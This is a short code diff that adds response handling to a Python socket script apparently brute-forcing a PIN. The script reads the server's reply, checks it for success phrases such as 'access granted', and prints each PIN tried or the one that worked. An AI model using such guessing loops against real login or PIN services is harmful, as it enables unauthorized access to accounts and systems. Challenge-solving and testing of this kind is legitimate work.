@@ -24,6 +24,21 @@ request = (
 )
 
 client_socket.sendall(request.encode())
+response = b""
+while True:
+    part = client_socket.recv(4096)
+    if not part:
+        break
+    response += part
+
+decoded_response = response.decode(errors="ignore")
+
+if "congratulations" in decoded_response.lower() or "access granted" in decoded_response.lower() or "welcome" in decoded_response.lower():
+    print(f"[+] Found correct PIN: {formatted_pin}")
+    print(decoded_response)
+    break
+else:
+    print(f"[-] Tried PIN: {formatted_pin}")
 
 
 print("Socket connected")
